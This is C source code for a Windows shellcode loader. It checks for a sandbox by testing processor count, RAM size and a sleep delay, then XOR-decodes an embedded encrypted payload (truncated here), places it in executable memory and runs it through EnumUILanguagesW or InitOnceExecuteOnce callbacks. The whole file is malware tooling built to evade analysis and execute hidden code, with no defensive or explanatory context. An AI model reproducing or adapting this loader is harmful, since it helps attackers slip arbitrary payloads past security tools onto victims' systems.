#include <windows.h>
#include <stdio.h>

BOOL CheckSandbox() {
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    if (systemInfo.dwNumberOfProcessors < 2)
        return TRUE;

    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx(&memoryStatus);
    DWORD RAMsize = (DWORD)(memoryStatus.ullTotalPhys / 1024 / 1024);
    if (RAMsize < 2048)
        return TRUE;

    Sleep(5000);
    return FALSE;
}

int main() {
    if (CheckSandbox() == TRUE)
        return 0;

    // 🔹 Use an unsigned char array instead of a string literal
unsigned char encryptedShellcode[] = { 0x37, 0x2a, 0xea, 0x87, 0x2a, 0xe0, 0x85, 0x92, 0x2b, 0xe2, .....};
unsigned char key[] = { 0x61, 0x62, 0x63 };

    // 🔹 Define shellcode buffer (size same as encrypted shellcode)
    unsigned char shellcode[sizeof(encryptedShellcode)];

    // 🔹 XOR decoding
    int j = 0;
    for (int i = 0; i < sizeof(encryptedShellcode); i++) {
        shellcode[i] = encryptedShellcode[i] ^ key[j];
        j = (j + 1) % sizeof(key);
    }

    try {
        LPVOID address = VirtualAlloc(NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(address, shellcode, sizeof(shellcode));

        EnumUILanguagesW((UILANGUAGE_ENUMPROCW)address, MUI_LANGUAGE_ID, NULL);
        return 0;
    }
    catch (...) {
        HANDLE hProcess = GetCurrentProcess();
        LPVOID address = VirtualAlloc(NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(address, shellcode, sizeof(shellcode));

        PVOID lpContext;
        INIT_ONCE g_InitOnce = INIT_ONCE_STATIC_INIT;

        InitOnceExecuteOnce(&g_InitOnce, (PINIT_ONCE_FN)address, NULL, &lpContext);
    }
}
